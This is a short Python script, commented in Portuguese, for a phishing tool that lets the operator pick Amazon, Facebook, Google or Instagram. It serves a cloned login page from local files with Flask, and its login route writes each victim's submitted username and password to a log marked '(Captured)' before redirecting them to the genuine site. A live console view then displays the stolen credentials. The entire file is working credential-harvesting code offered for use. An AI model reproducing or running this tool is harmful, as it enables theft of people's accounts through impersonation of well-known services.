#!/bin/python3
# Libs
import wget, platform, os, time, threading

# inicia  o server
def start(path, redirecter):

    # conferindo users.log existe 
    open('users.log', 'w')
    rd = open(redirecter, 'r').read()
   
    # sub-imports 
    from flask import (Flask, render_template, request, redirect, session)
    app = Flask(__name__)

    # rotas para flask
    @app.route('/l', methods = ['POST', 'GET'])
    def login():
        u = request.form.get('user')
        p = request.form.get('pwd')     

        ar = open('users.log', 'a')
        ar.write(f"(Captured): User: {u}, Senha: {p}\n")
        print("Pishing !!")

        return redirect(rd)


    @app.route('/')
    def index():
        html = open(path, 'r').read()
        return html

    t = threading.Thread(target=app.run) # deixa o servidor em uma thread mas nao executa
    t.start() # executa o servidor

    while True: # executa o loop ao mesmo tempo que o servidor
        try:
            os.system('clear')
            lg = open('users.log', 'r').read()

            print("Fishing Link: http://127.0.0.1:5000")
            print("Await …\n")
            print(lg)

            time.sleep(3.30)
            os.system('clear')

        except KeyboardInterrupt:
            t._stop()
            os.system('clear')
            break



os.system('clear')
print("Chose Option")
print("1 Amazon  \t 3 Google")
print("2 Facebook\t 4 Instagram")

option = input(">> ")

# para cada opção ele inicia o servidor com o index e o redirect pos pishsing.
if option == '1':
    start(path="./pages/amazon/index.html", redirecter="./pages/amazon/redirect.txt")
    print("Ok")

if option == '2':
    start(path="./pages/facebook/index.html", redirecter="./pages/facebook/redirect.txt")
if option == '3':
    start(path="./pages/google/index.html", redirecter="./pages/google/redirect.txt")
if option == '4':
    start(path="./pages/instagram/index.html", redirecter="./pages/instagram/redirect.txt")